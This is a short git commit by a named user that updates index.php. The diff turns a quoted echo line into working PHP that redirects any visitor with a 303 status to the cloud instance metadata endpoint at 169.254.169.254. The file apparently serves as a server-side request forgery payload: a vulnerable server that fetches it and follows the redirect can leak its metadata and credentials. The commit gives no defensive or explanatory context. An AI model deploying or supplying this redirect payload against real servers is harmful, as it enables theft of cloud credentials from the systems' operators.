f341f33c2f2813c098999aa843df66375936d397
Tarun Garg <45597781+tarungarg1999@users.noreply.github.com>
2021-07-10 17:01:15 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,4 +1,4 @@
 <html><body>
-echo "<?php header('Location: http://169.254.169.254/latest/meta-data/', TRUE, 303); ?>"
+<?php header('Location: http://169.254.169.254/latest/meta-data/', TRUE, 303); ?>
   </body>
 </html>
